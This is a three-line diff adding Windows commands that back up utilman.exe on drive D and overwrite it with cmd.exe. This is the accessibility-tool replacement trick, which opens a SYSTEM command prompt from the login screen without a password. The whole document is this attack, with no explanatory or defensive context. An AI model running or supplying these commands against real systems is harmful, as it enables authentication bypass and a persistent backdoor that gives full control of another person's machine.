@@ -1,0 +1,3 @@
+ren d:\windows\system32\utilman.exe utilman.exe.bak 
+copy d:\windows\system32\cmd.exe d:\windows\system32\utilman.exe 
+exit
